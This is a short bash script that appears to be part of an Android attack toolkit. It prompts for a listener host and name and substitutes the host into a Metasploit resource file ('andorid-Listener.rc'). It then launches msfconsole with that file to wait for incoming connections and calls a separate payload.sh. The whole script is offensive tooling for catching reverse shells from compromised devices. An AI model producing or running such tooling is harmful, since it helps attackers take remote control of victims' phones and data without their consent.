#!/bin/bash
echo ""
echo ""
echo ""

printf " \e[1;31;42m LHOST for Listener   \e[0m \e[40;38;5;82m====> : \e[0m " | pv -qL 10

	read lhost
echo "" 

printf " \e[1;31;42m Name for Listener    \e[0m \e[40;38;5;82m====> : \e[0m " | pv -qL 10

	read name
sed -e "s/\$lhost/$lhost/" andorid-Listener.rc > $name.rc
	msfconsole -r $name.rc
	clear 
	
	./payload.sh 
